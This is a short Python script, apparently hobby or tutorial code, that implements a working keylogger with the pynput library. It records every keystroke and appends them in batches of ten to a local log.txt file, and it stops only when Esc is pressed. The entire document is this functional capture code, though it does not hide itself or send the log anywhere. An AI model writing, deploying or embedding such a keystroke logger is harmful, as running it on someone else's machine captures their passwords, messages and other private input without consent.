import pynput

from pynput.keyboard import Key, Listener

count=0
keys=[]

def on_press(key):
    """When a key is pressed, pressed key will be added to 'keys' list.
    Count variable integer increased by one. 'write_file' funciton executed
    upon count reaching specified amount"""
    global keys, count
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

#requires log.txt to be in same location as launched python application, otherwise specify location
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

